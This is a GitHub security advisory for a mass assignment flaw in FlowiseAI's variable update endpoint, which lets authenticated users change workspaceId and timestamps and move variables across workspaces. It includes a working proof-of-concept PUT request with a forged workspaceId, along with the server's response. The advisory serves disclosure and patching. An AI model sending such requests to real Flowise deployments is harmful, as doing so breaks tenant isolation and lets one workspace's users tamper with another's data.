# [H] FlowiseAI has Mass Assignment in Variable Update Endpoint that Allows Cross-Workspace Resource Reassignment

## Summary
Severity: High
Advisory: GHSA-6fw7-3q8r-m5vj
CVE: CVE-2026-42861
CWE: CWE-284, CWE-639, CWE-915
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-6fw7-3q8r-m5vj
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.2

## Details
### Summary
A Mass Assignment vulnerability exists in the variable update endpoint of FlowiseAI.

The endpoint allows authenticated users to modify server-controlled properties such as workspaceId, createdDate, and updatedDate when updating a variable resource.

Due to missing server-side validation and authorization checks, an attacker can manipulate the workspaceId field and reassign variables to arbitrary workspaces.

This behavior may break tenant isolation in multi-workspace environments.

### Details
The endpoint responsible for updating variables:

**PUT /api/v1/variables/{variableId}**

accepts a JSON request body containing the variable definition.

However, the backend does not restrict which attributes can be modified by the client. As a result, user-controlled request bodies can include internal properties that should normally be controlled exclusively by the server.

Server-controlled fields that can be manipulated include:

- workspaceId
- createdDate
- updatedDate

These fields appear to be directly mapped to the database entity without strict input validation or authorization checks.

For example, the following request body was accepted by the server:

```json
{
  "name": "aaa",
  "value": "bbbe",
  "type": "static",
  "createdDate": "2016-03-06T17:59:30.000Z",
  "updatedDate": "2016-03-06T18:00:17.000Z",
  "workspaceId": "11111111-2222-3333-4444-555555555555"
}
```

The server accepted the attacker-controlled workspaceId and metadata fields and persisted them.

### PoC
**Request**

```http
PUT /api/v1/variables/<VARIABLE_ID>
Content-Type: application/json

{
  "name": "aaa",
  "value": "bbbe",
  "type": "static",
  "createdDate": "2016-03-06T17:59:30.000Z",
  "updatedDate": "2016-03-06T18:00:17.000Z",
  "workspaceId": "11111111-2222-3333-4444-555555555555"
}
```

**Response**

```json
{
  "id": "0a2b9f61-4a97-4ff8-b80d-00275ed18674",
  "name": "aaa",
  "value": "bbbe",
  "type": "static",
  "createdDate": "2016-03-06T17:59:30.000Z",
  "updatedDate": "2026-03-06T18:05:17.000Z",
  "workspaceId": "11111111-2222-3333-4444-555555555555"
}
```

This confirms that the backend accepts and persists attacker-controlled internal properties.

### Impact
This vulnerability allows authenticated users to manipulate internal attributes of variable resources.

Possible impacts include:

1. Cross-workspace reassignment of variables (workspaceId)
2. Unauthorized modification of metadata (createdDate, updatedDate)
3. Potential tenant isolation bypass in multi-workspace deployments

In multi-tenant environments, this may allow an attacker to move variables between workspaces without authorization.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6fw7-3q8r-m5vj
- https://nvd.nist.gov/vuln/detail/CVE-2026-42861
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.2
